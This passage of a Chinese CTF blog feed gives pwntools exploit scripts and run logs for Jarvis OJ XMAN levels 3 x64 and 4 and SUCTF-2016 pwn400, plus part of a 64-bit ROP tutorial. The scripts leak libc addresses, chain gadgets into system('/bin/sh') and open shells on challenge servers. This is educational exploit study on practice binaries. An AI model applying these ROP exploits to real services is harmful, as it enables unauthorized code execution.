class="line">payload += p32(<span class="number">1</span>)</div><div class="line">payload += p32(bss_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(sh)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>这个exp几乎和level4的相同，所以具体的一些坑就见下面吧。</p>
<h1 id="level-3-x64"><a href="#level-3-x64" class="headerlink" title="level 3 x64"></a>level 3 x64</h1><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>函数啥的，跟前面的level3一样。参数用rdi，rsi等寄存器优先传递。构造rop链。</p>
<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9883</span>)</div><div class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</div><div class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line"></div><div class="line">offset = <span class="number">0x80</span> + <span class="number">8</span></div><div class="line">read_got = elf.got[<span class="string">'read'</span>]</div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>]</div><div class="line">vuln_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</div><div class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006b3</span></div><div class="line">pop_rsi_pop_r15_ret_addr = <span class="number">0x00000000004006b1</span></div><div class="line">read_system_offset = libc.symbols[<span class="string">'read'</span>] - libc.symbols[<span class="string">'system'</span>]</div><div class="line">read_sh_offset = libc.symbols[<span class="string">'read'</span>] - next(libc.search(<span class="string">'/bin/sh\x00'</span>))</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_ret_addr)</div><div class="line">payload += p64(read_got)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(write_plt)</div><div class="line">payload += p64(vuln_addr)</div><div class="line">p.send(payload)</div><div class="line">read_addr = u64(p.recv(<span class="number">8</span>))</div><div class="line">system_addr = read_addr - read_system_offset</div><div class="line">sh_addr = read_addr - read_sh_offset</div><div class="line">log.success(<span class="string">"read address =&gt; &#123;&#125;"</span>.format(hex(read_addr)))</div><div class="line">log.success(<span class="string">"system address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"sh address =&gt; &#123;&#125;"</span>.format(hex(sh_addr)))</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/xman/3x64$ python exp.py</div><div class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9883: Done</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/xman/3x64/level3_x64&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/xman/3x64/libc-2.19.so&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">[+] read address =&gt; 0x7f5c484726a0</div><div class="line">[+] system address =&gt; 0x7f5c483cd590</div><div class="line">[+] sh address =&gt; 0x7f5c485038c3</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">level3_x64</div><div class="line">$ cat flag</div><div class="line">CTF&#123;b1aeaa97fdcc4122533290b73765e4fd&#125;</div></pre></td></tr></table></figure>
<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>main()函数和前同。</p>
<p>vuln函数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170629/8.jpg?raw=true" alt=""></p>
<p>没给libc，自己利用栈溢出和DynELF来泄露system地址。完了后调用read函数往bss段写入sh字符串，最后完成调用。这个思路很老套了。不过自己写的时候踩了很多坑，列举如下：</p>
<ul>
<li>leak函数中，若每次leak完后跳转到vuln函数地址，则远程getshell不成功，尽管本地测试可以。</li>
<li>leak函数中，需要在leak后先pop3把栈上参数清空后再进行跳转到main函数中，否则本地或远程getshell都不成功。</li>
<li>在泄露完system地址后，若再调用一次start函数以恢复栈，则远程getshell不成功，尽管本地测试可以。</li>
<li>还有一些…</li>
</ul>
<p>以上几点，在以前利用时没遇到过，这次想了很久也不知道为什么。。。</p>
<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="comment"># p = process("./level4")</span></div><div class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9880</span>)</div><div class="line"><span class="comment"># p = remote("127.0.0.1",12345)</span></div><div class="line">elf = ELF(<span class="string">"./level4"</span>)</div><div class="line"></div><div class="line">pop3addr = <span class="number">0x08048509</span></div><div class="line">offset = <span class="number">0x88</span> + <span class="number">4</span></div><div class="line">bss_addr = elf.bss() + <span class="number">0x20</span></div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>]</div><div class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</div><div class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	log.info(<span class="string">"leaking address =&gt; &#123;&#125;"</span>.format(hex(address)))</div><div class="line">	<span class="comment"># p.recvuntil("Input:\n")</span></div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p32(write_plt)</div><div class="line">	payload += p32(pop3addr)</div><div class="line">	payload += p32(<span class="number">1</span>)</div><div class="line">	payload += p32(address)</div><div class="line">	payload += p32(<span class="number">4</span>)</div><div class="line">	payload += p32(main_addr)</div><div class="line">	p.send(payload)</div><div class="line">	data = p.recv(<span class="number">4</span>)</div><div class="line">	<span class="keyword">return</span> data</div><div class="line"></div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">"./level4"</span>))</div><div class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</div><div class="line">log.success(<span class="string">"system address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line"></div><div class="line">sh = <span class="string">"/bin/sh\x00"</span></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p32(read_plt)</div><div class="line">payload += p32(pop3addr)</div><div class="line">payload += p32(<span class="number">0</span>)</div><div class="line">payload += p32(bss_addr)</div><div class="line">payload += p32(len(sh))</div><div class="line">payload += p32(system_addr)</div><div class="line">payload += p32(<span class="number">1</span>)</div><div class="line">payload += p32(bss_addr)</div><div class="line">p.send(payload)</div><div class="line">p.send(sh)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/xman/4$ python exp.py</div><div class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/xman/4/level4&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] leaking address =&gt; 0x8048000</div><div class="line">0x8048000 \x7fELF</div><div class="line">[+] Loading from &apos;/home/chybeta/pwn/ctf/xman/4/level4&apos;: 0xf77fb930</div><div class="line">[*] leaking address =&gt; 0x804a004</div><div class="line">.....</div><div class="line">.....</div><div class="line">[+] system address =&gt; 0xf769be80</div><div class="line">[*] Switching to interactive mode</div><div class="line">$</div><div class="line">$</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">level4</div><div class="line">$ cat flag</div><div class="line">CTF&#123;882130cf51d65fb705440b218e94e98e&#125;</div></pre></td></tr></table></figure>
<h1 id=""><a href="#" class="headerlink" title=":)"></a>:)</h1><p>文件已打包：<a href="http://pan.baidu.com/s/1eR2XzNk" target="_blank" rel="external">http://pan.baidu.com/s/1eR2XzNk</a> 密码：9y4l<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">xman</div><div class="line">├── 0</div><div class="line">│   ├── exp.py</div><div class="line">│   └── level0</div><div class="line">├── 1</div><div class="line">│   ├── exp.py</div><div class="line">│   └── level1</div><div class="line">├── 2</div><div class="line">│   ├── exp.py</div><div class="line">│   └── level2</div><div class="line">├── 2x64</div><div class="line">│   ├── exp.py</div><div class="line">│   └── level2_x64</div><div class="line">├── 3</div><div class="line">│   ├── exp2.py</div><div class="line">│   ├── exp.py</div><div class="line">│   ├── level3</div><div class="line">│   └── libc-2.19.so</div><div class="line">├── 3x64</div><div class="line">│   ├── exp.py</div><div class="line">│   ├── level3_x64</div><div class="line">│   └── libc-2.19.so</div><div class="line">└── 4</div><div class="line">    ├── exp.py</div><div class="line">    └── level4</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;web狗的二进制之路&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF-2016-pwn400-writeup</title>
    <link href="http://yoursite.com/2017/06/28/SUCTF-2016-pwn400-writeup/"/>
    <id>http://yoursite.com/2017/06/28/SUCTF-2016-pwn400-writeup/</id>
    <published>2017-06-28T06:57:33.000Z</published>
    <updated>2017-07-01T14:17:33.714Z</updated>
    
    <content type="html"><![CDATA[<p>SUCTF-2016-pwn400-writeup<br><a id="more"></a><br>IDA看，程序流程简单，有明显栈溢出漏洞。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170628/1.jpg?raw=true" alt=""></p>
<p>无libc，无canary等保护。基本的思路如下：</p>
<ul>
<li>构造ROP链</li>
<li>泄露system地址</li>
<li>往bss段写入/bin/sh</li>
<li>调用system</li>
</ul>
<p>最后的exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./simple"</span>)</div><div class="line">elf = ELF(<span class="string">"./simple"</span>)</div><div class="line"></div><div class="line">offset = <span class="number">40</span></div><div class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006c3</span></div><div class="line">pop_rsi_pop_r15_ret = <span class="number">0x00000000004006c1</span></div><div class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>]</div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</div><div class="line">bss_addr = elf.bss() + <span class="number">0x18</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	log.info(<span class="string">"leak address =&gt; &#123;&#125;"</span>.format(hex(address)))</div><div class="line">	p.recvuntil(<span class="string">'luck!\n'</span>)</div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(pop_rdi_ret_addr)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(pop_rsi_pop_r15_ret)</div><div class="line">	payload += p64(address)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(write_plt)</div><div class="line">	payload += p64(main_addr)</div><div class="line">	p.sendline(payload)</div><div class="line">	address = p.recv(<span class="number">8</span>)</div><div class="line">	<span class="keyword">return</span> address</div><div class="line">d = DynELF(leak,elf = elf)</div><div class="line"></div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</div><div class="line">log.success(<span class="string">"system address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(start_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">'luck!\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_ret)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(read_plt)</div><div class="line">payload += p64(main_addr)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">payload = <span class="string">'/bin/sh\x00'</span></div><div class="line">p.send(payload)</div><div class="line">p.recvuntil(<span class="string">'luck!\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170628/2.gif?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SUCTF-2016-pwn400-writeup&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>ROP学习：64位栈溢出</title>
    <link href="http://yoursite.com/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://yoursite.com/2017/06/26/ROP学习：64位栈溢出/</id>
    <published>2017-06-26T11:44:03.000Z</published>
    <updated>2017-06-27T03:38:40.341Z</updated>
    
    <content type="html"><![CDATA[<p>web狗的二进制之路。<br><a id="more"></a></p>
<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>c程序 test.c ：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> name[<span class="number">0x50</span>];</div><div class="line">    read(<span class="number">0</span>, name, <span class="number">0x100</span>);</div><div class="line">    write(<span class="number">1</span>, name, <span class="number">0x100</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    func();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc test.c -o pwn -O0 -fno-stack-protector</div></pre></td></tr></table></figure></p>
<p>选项 <code>-O0</code> 表示不进行任何优化， <code>-fno-stack-protector</code>表示无canary保护。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>C语言调用机制使用了栈数据结构，先进后出。同时栈是由高地址向低地址增长。</p>
<p>在64位环境下，函数的调用所需要的参数是优先通过寄存器来进行的。寄存器的顺序如下：rdi,rsi,rdx,rcx,r8,r9。当一个函数有大于6个整形参数，则超出的部分会通过栈来传递，这个情况少见。</p>
<p>64位环境下，还有几个特殊的指针（寄存器）：rip、rbp和rsp。其中rip是指令指针，cpu会把rip指向的内容当作指令执行。rbp指向当前栈帧的底部。rsp指向当前栈帧的顶部。</p>
<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>由于64位下，是优先通过寄存器来传参，所以不能像在32位环境下直接去布置栈上的数据来exp。这时需要用到ROP技术(Retrun-oriented Programmming)，从可执行文件或者库中提取部分代码片段来进行恶意利用。</p>
<p>比如我们想要传入一个参数，那这个参数需要被布置到寄存器rdi中，这时我们可以寻找诸如<code>pop rdi;ret</code>的代码片段，从而在执行完<code>pop rdi</code>后把栈上布置好的数据存放到寄存器rdi中后能够再次控制程序执行流（ret）</p>
<p>常见的寻找ROP的工具有很多，这里使用<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">ROPgadget</a>。以前面的例子为例。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary &quot;pwn&quot; --only &quot;pop|ret&quot;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170626/1.jpg?raw=true" alt=""></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>我们的测试程序是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> name[<span class="number">0x50</span>];</div><div class="line">    read(<span class="number">0</span>, name, <span class="number">0x100</span>);</div><div class="line">    write(<span class="number">1</span>, name, <span class="number">0x100</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    func();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>有非常明显的栈溢出漏洞，read从标准输入流（0）读取0x100放到name里面，之后write从name中读取长度为0x100的字节输出到屏幕（1）。我们可以通过输入，从而去覆盖func（）的返回地址，从而劫持控制流。</p>
<p>为能找到溢出点，可以使用pattern.py来测试。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/test$ pattern 100</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</div></pre></td></tr></table></figure></p>
<p>接着利用gdb，在运行（r）后输入上述生成的字符串，此时gdb发生段错误。因为是在64位环境下，指针无法到达高地址，即不能超过0x00007fffffffffff，所以不能直接利用查看$eip的方法。但因为<code>ret</code>指令，相当于<code>pop rsp</code>，所以只要看一下<code>rsp</code>的值，就知道跳转的地址，从而知道溢出点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/gx $rsp</div><div class="line">0x7fffffffdc98:	0x3164413064413963</div><div class="line"></div><div class="line">.......</div><div class="line"></div><div class="line">(venv) chybeta@ubuntu:~/pwn/test$ pattern 0x3164413064413963</div><div class="line">Pattern 0x3164413064413963 first occurrence at position 88 in pattern.</div></pre></td></tr></table></figure></p>
<p>所以，溢出点是88个字节。</p>
<h2 id="提供libc"><a href="#提供libc" class="headerlink" title="提供libc"></a>提供libc</h2><h3 id="环境准备-1"><a href="#环境准备-1" class="headerlink" title="环境准备"></a>环境准备</h3><p>用ldd命令可以看到pwn程序运行时使用的libc.so。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/test$ ldd pwn</div><div class="line">	linux-vdso.so.1 =&gt;  (0x00007ffeb7d64000)</div><div class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb139e93000)</div><div class="line">	/lib64/ld-linux-x86-64.so.2 (0x00005602037ac000)</div></pre></td></tr></table></figure></p>
<p>将<code>/lib/x86_64-linux-gnu/libc.so.6</code>拷贝到当前目录下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp /lib/x86_64-linux-gnu/libc.so.6 libc.so</div></pre></td></tr></table></figure></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
<li>提供了libc.so，可以计算出read函数与system函数和sh字符串的偏移量。</li>
<li>利用write函数泄露出read函数的地址，从而计算system函数和sh字符串的真实地址。</li>
<li>调用system函数，并传入参数，即sh字符串。</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><p>接下去根据exp进行一下详细的讲解。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">"./pwn"</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn"</span>)</div><div class="line">libc = ELF(<span class="string">"libc.so"</span>)  <span class="comment"># 题目提供</span></div><div class="line"></div><div class="line">offset = <span class="number">88</span>  </div><div class="line">offset_read_system = libc.symbols[<span class="string">"read"</span>] - libc.symbols[<span class="string">"system"</span>]</div><div class="line">offset_read_binsh =  libc.symbols[<span class="string">"read"</span>] - next(libc.search(<span class="string">"/bin/sh\x00"</span>))</div><div class="line">log.success(<span class="string">"offset_read_system =&gt; &#123;&#125;"</span>.format(hex(offset_read_system)))</div><div class="line">log.success(<span class="string">"offset_read_binsh =&gt; &#123;&#125;"</span>.format(hex(offset_read_binsh)))</div></pre></td></tr></table></figure></p>
<p>offset偏移由pattern.py和gdb计算得出。read与system地址和sh地址由提供的libc，结合pwntools得到。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400623</span></div><div class="line">pop_rsi_pop_r15_addr = <span class="number">0x0000000000400621</span></div></pre></td></tr></table></figure>
<p>两个地址，由ROPgadget得到，用于参数的传递。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">payload += p64(elf.got[<span class="string">"read"</span>])</div><div class="line">payload += p64(<span class="number">1</span>)    </div><div class="line">payload += p64(elf.plt[<span class="string">'write'</span>])</div><div class="line">payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">p.send(payload)</div></pre></td></tr></table></figure>
